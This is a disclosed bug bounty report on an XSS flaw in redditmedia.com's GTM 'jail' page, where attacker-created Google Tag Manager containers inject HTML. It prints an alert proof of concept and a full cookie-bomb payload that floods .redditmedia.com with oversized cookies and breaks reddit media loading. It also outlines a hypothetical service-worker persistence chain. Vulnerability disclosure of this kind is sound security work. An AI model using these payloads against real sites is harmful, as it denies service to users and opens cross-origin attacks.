# XSS in redditmedia.com can compromise data of reddit.com

## Report Details
- **Report ID**: 862882
- **URL**: https://hackerone.com/reports/862882
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-04-29T23:02:52.981Z
- **Disclosed**: 2022-08-03T15:40:13.808Z

## Reporter
- **Username**: keer0k
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reddit

## Vulnerability Information
# Description

Hi, i would like to report a XSS in redditmedia.com that can affect the reddit.com application. In redditmedia.com domain we are in the domain that reddit.com use to get all the thumbmails of any post.

I found that redditmedia.com/gtm/jail uses the "id" parameter to get a valid GTM id and import it from google tag manager. With that, I can create a google tag manager account, create my own html and generate a valid GTM id to be introduced at redditmedia.com/gtm/jail.

I created a gtm with the content `<html> <img src = x onerror = alert (1)> </html>` and it worked. The XSS was triggered. You can check using the id `GTM-KM2VT3H`.

I discovered two scenarios that can affect reddit.com, one of which is making this XSS make a cookie bomb, creating a large amount of cookies for .redditmedia.com that will make the service unavailable to the user (only for the user who accesses the malicious GTM page)

The PoC for this case is as follows:
```
<html>
 <img src=x onerror="document.cookie='x1='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x2='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x3='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x4='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x5='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x6='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x7='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x8='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x9='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x10='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x11='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x12='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x13='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x14='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x15='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x16='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x17='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x18='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x19='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x20='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x21='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x22='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x23='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x24='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x25='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x26='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x27='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x28='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x29='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x30='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x31='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x32='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x33='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x34='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x35='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
<img src=x onerror="document.cookie='x36='+Array(3900).join(0)+';Expires=Wed, 02 Apr 2025 12:21:55 GMT;Path=/;Domain=.redditmedia.com'">
</html>
```
Ps: you need to put this code into your GTM tag.

after the user accesses the GTM page containing this content, thumbs, videos and other media contained on reddit.com will not be reproduced (midias that come from redditmedia.com).

The second case, is where it would be even more dangerous, however, I was unable to reproduce it, because for it to work I would need to have a jsonp endpoint at * .redditmedia.com, however, I didn't find it. But anyway, I will explain the case.

If I had a hypothetical JSONP at `redditmedia.com/anypath/?jsonp=xxx` I could use this JSONP as a chain for my XSS to write a service worker in the application, this way, no matter what ID was opened at redditmedia.com/gtm/jail?id=, I could control the page and make it return a malicious script to reddit.com creating the possibility of affecting users on reddit.com.

# Steps to reproduce XSS

1. go to https://redditmedia.com/gtm/jail?id=GTM-KM2VT3H&cb=aa
2. XSS will be trigger

# Steps to reproduce XSS to Cookie Bomb

1. go to https://redditmedia.com/gtm/jail?id==GTM-MS246QG&cb=aa
2. Cookie will be add
3. navigate to https://reddit.com/
4. some thumbs, images and other midias will no apear

## Impact

Its possible to compromise that cross-origin and destabilize a website for the user

## Attachments
No attachments
